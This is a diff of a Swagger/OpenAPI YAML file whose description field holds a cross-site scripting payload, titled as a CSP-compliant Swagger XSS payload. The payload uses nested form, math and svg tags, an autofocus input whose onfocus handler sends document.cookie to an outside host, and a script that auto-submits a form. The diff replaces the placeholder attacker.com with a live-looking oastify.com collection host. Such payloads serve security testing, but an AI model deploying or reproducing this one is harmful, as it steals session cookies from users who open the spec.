@@ -3,8 +3,8 @@ info:
   title: CSP-Compliant Swagger XSS Payloadd
   description: |
     <form><math><mtext></form><form><mglyph><svg><mtext><textarea>
-    </svg></mtext></mglyph></textarea><form action="https://attacker.com/log" id="xss">
-      <input autofocus onfocus="fetch('https://attacker.com?c='+document.cookie)">
+    </svg></mtext></mglyph></textarea><form action="https://job8rymwzhh80vskwr36etjhj8pzdp1e.oastify.com/log" id="xss">
+      <input autofocus onfocus="fetch('https://job8rymwzhh80vskwr36etjhj8pzdp1e.oastify.com?c='+document.cookie)">
     </form><script>document.getElementById('xss').submit()</script>
   version: 1.0.0
 paths:
